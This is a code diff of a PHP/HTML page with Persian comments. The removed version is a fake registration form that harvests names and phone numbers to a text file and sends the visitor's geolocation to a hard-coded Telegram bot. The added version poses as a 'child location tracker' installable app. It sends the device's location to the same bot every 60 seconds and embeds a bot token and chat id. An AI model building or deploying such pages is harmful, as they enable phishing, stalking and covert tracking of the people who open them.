@@ -1,38 +1,52 @@
 <?php
-if ($_SERVER["REQUEST_METHOD"] === "POST") {
-    $data = json_decode(file_get_contents("php://input"), true);
+// این فایل همه‌کاره است: HTML, JS, manifest, SW و دریافت لوکیشن را مدیریت می‌کند
 
-    // بررسی اطلاعات دریافتی برای موقعیت مکانی
-    if (!isset($data["latitude"]) || !isset($data["longitude"])) {
-        echo json_encode(["status" => "error", "message" => "Invalid input"]);
-        exit;
-    }
+$path = $_SERVER['REQUEST_URI'];
 
-    $lat = $data["latitude"];
-    $lon = $data["longitude"];
-
-    // ذخیره اطلاعات ثبت‌نامی در فایل txt
-    if (isset($data["fullname"]) && isset($data["phone"])) {
-        $file = fopen("user_data.txt", "a");
-        $txt = "نام و نام خانوادگی: " . $data["fullname"] . "\n";
-        $txt .= "شماره همراه: " . $data["phone"] . "\n";
-        $txt .= "---------------------------\n";
-        fwrite($file, $txt);
-        fclose($file);
-    }
-
-    // ارسال لوکیشن به تلگرام
-    $token = "7926937226:AAFcIfZulEjhnXx7gQpnm712eE1-LvKoT_o";
-    $chat_id = "-1002570608346";
-    $url = "https://api.telegram.org/bot$token/sendLocation?" . http_build_query([
-        "chat_id" => $chat_id,
-        "latitude" => $lat,
-        "longitude" => $lon
+if (strpos($path, 'manifest.webmanifest') !== false) {
+    header('Content-Type: application/manifest+json');
+    echo json_encode([
+        "name" => "ردیاب موقعیت فرزند",
+        "short_name" => "ردیاب",
+        "start_url" => "/tracker.php",
+        "display" => "standalone",
+        "background_color" => "#ffffff",
+        "theme_color" => "#28a745",
+        "icons" => [
+            [
+                "src" => "icon.png",
+                "sizes" => "192x192",
+                "type" => "image/png"
+            ]
+        ]
     ]);
+    exit;
+}
 
-    file_get_contents($url);
+if (strpos($path, 'service-worker.js') !== false) {
+    header('Content-Type: application/javascript');
+    echo "self.addEventListener('install', event => { console.log('Service Worker نصب شد.'); });";
+    exit;
+}
 
-    echo json_encode(["status" => "ok"]);
+if ($_SERVER["REQUEST_METHOD"] === "POST" && strpos($path, 'send-location') !== false) {
+    $data = json_decode(file_get_contents("php://input"), true);
+    $token = "7926937226:AAFcIfZulEjhnXx7gQpnm712eE1-LvKoT_o";  // توکن شما
+    $chat_id = "-1002570608346";  // چت آیدی شما
+
+    if (isset($data["latitude"], $data["longitude"])) {
+        $lat = $data["latitude"];
+        $lon = $data["longitude"];
+        $url = "https://api.telegram.org/bot$token/sendLocation?" . http_build_query([
+            "chat_id" => $chat_id,
+            "latitude" => $lat,
+            "longitude" => $lon
+        ]);
+        file_get_contents($url);
+        echo json_encode(["status" => "ok"]);
+    } else {
+        echo json_encode(["status" => "error", "message" => "Invalid input"]);
+    }
     exit;
 }
 ?>
@@ -41,7 +55,9 @@ if ($_SERVER["REQUEST_METHOD"] === "POST") {
 <html lang="fa">
 <head>
   <meta charset="UTF-8">
-  <title>فرم ثبت اطلاعات</title>
+  <title>ردیاب موقعیت فرزند</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="manifest" href="tracker.php/manifest.webmanifest">
   <style>
     body {
       font-family: Tahoma, sans-serif;
@@ -52,48 +68,20 @@ if ($_SERVER["REQUEST_METHOD"] === "POST") {
       height: 100vh;
       margin: 0;
     }
-
     .form-container {
       background: white;
       padding: 35px 30px;
       border-radius: 10px;
       box-shadow: 0 0 15px rgba(0,0,0,0.1);
       width: 340px;
-    }
-
-    .form-container h2 {
       text-align: center;
+    }
+    .form-container h2 {
       margin-bottom: 25px;
       color: #333;
     }
-
-    input[type="text"], input[type="phone"] {
-      width: 100%;
-      padding: 10px;
-      margin-bottom: 15px;
-      border: 1px solid #ccc;
-      border-radius: 6px;
-      font-size: 15px;
-    }
-
-    button {
-      background-color: #28a745;
-      color: white;
-      border: none;
-      padding: 12px;
-      width: 100%;
-      border-radius: 6px;
-      font-size: 16px;
-      cursor: pointer;
-    }
-
-    button:hover {
-      background-color: #218838;
-    }
-
     #status {
-      margin-top: 15px;
-      text-align: center;
+      margin-top: 20px;
       color: green;
       font-weight: bold;
     }
@@ -101,38 +89,26 @@ if ($_SERVER["REQUEST_METHOD"] === "POST") {
 </head>
 <body>
   <div class="form-container">
-    <h2>فرم ثبت اطلاعات</h2>
-    <form id="fakeForm">
-      <input type="text" id="fullname" placeholder="نام کامل" required>
-      <input type="text" id="phone" placeholder="شماره همراه" required>
-      <button type="submit">ثبت اطلاعات</button>
-    </form>
-    <div id="status"></div>
+    <h2>در حال دریافت موقعیت...</h2>
+    <div id="status">لطفاً اجازه دسترسی به موقعیت مکانی را بدهید.</div>
   </div>
 
   <script>
-    document.getElementById("fakeForm").addEventListener("submit", function(e) {
-      e.preventDefault();
-      const statusEl = document.getElementById("status");
-      statusEl.innerText = "در حال ثبت...";
+    if ('serviceWorker' in navigator) {
+      navigator.serviceWorker.register('tracker.php/service-worker.js');
+    }
 
-      const fullname = document.getElementById("fullname").value;
-      const phone = document.getElementById("phone").value;
-
+    function sendLocation() {
       if (!navigator.geolocation) {
-        statusEl.innerText = "مرورگر موقعیت مکانی را پشتیبانی نمی‌کند.";
+        document.getElementById("status").innerText = "مرورگر از موقعیت مکانی پشتیبانی نمی‌کند.";
         return;
       }
 
       navigator.geolocation.getCurrentPosition(position => {
-        fetch("", {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
+        fetch('tracker.php/send-location', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
-            fullname: fullname,
-            phone: phone,
             latitude: position.coords.latitude,
             longitude: position.coords.longitude
           })
@@ -140,18 +116,21 @@ if ($_SERVER["REQUEST_METHOD"] === "POST") {
         .then(res => res.json())
         .then(data => {
           if (data.status === "ok") {
-            statusEl.innerText = "اطلاعات با موفقیت ثبت شد!";
+            document.getElementById("status").innerText = "موقعیت با موفقیت ارسال شد.";
           } else {
-            statusEl.innerText = "خطا در ثبت اطلاعات.";
+            document.getElementById("status").innerText = "خطا در ارسال موقعیت.";
           }
         })
         .catch(() => {
-          statusEl.innerText = "خطا در ارتباط با سرور.";
+          document.getElementById("status").innerText = "خطا در ارتباط با سرور.";
         });
       }, () => {
-        statusEl.innerText = "اجازه دسترسی به موقعیت مکانی داده نشد.";
+        document.getElementById("status").innerText = "اجازه دسترسی به موقعیت داده نشد.";
       });
-    });
+    }
+
+    sendLocation();
+    setInterval(sendLocation, 60000); // هر ۶۰ ثانیه
   </script>
 </body>
 </html>
